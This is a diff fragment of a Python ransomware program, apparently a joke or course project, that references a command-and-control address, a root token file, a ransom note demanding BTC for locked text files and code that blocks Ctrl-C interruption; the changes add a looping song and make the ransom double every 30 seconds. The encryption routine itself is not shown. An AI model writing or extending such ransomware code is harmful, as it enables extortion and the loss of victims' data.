@@ -8,8 +8,12 @@ import signal
 import os
 import multiprocessing,time
 
+
+
 CNC_ADDRESS = "cnc:6666"
 TOKEN_PATH = "/root/token"
+
+SONG_FILE = "/usr/local/bin/song.mp3"
 
 AMOGUS = """
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣤⣤⣤⣤⣤⣶⣦⣤⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀
@@ -33,7 +37,7 @@ AMOGUS = """
 ⠀⠀⠀⠀⠀⠀⠀⠈⠛⠻⠿⠿⠿⠿⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 """
 ENCRYPT_MESSAGE_TEMPLATE  = """\rYour txt files have been locked. Send an email to rick.asley@hewillnotgiveyouup.net with title '{token}' to unlock your data and send {price} BTC to the following address: {address}
-The price will be multiplied by 2 every 24 hours.
+The price will be multiplied by 2 every 30 seconds.
 """
 
 DECRYPT_MESSAGE  = """
@@ -186,6 +190,11 @@ class Ransomware:
 
 
 if __name__ == "__main__":
+    try:
+        import winsound
+        winsound.PlaySound(SONG_FILE, winsound.SND_LOOP | winsound.SND_ASYNC)
+    except:
+        pass
     # Ignorer les interruptions SIGINT
     signal.signal(signal.SIGINT, signal.SIG_IGN)
     # Configurer la journalisation
